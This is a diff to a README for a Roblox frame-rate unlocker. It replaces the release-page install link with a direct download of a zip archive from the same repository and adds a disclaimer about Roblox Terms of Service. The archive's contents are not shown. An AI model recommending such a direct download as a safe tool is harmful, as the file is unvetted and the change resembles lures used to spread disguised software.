@@ -17,7 +17,7 @@ Roblox FPS Unlocker is a lightweight and powerful tool that removes the default 
 > This project is for educational and personal use only. Use at your own risk. The authors are not responsible for any account issues or violations of Roblox Terms of Service.
 
 ## Install
-[Download `RobloxFPSUnlocker.zip`](https://github.com/joker01728/robloxfpsunlocker/releases/latest)
+[Download `rbxfpsunlocker.zip`](https://github.com/joker01728/robloxfpsunlocker/releases/download/roblox/rbxfpsunlocker.zip)
 ---
 > Optimized for Windows 11.
 <img width="1024" height="368" alt="image-1291" src="https://github.com/user-attachments/assets/5d3b1aa1-e8d3-40c7-a9cb-ed07a712888d" />
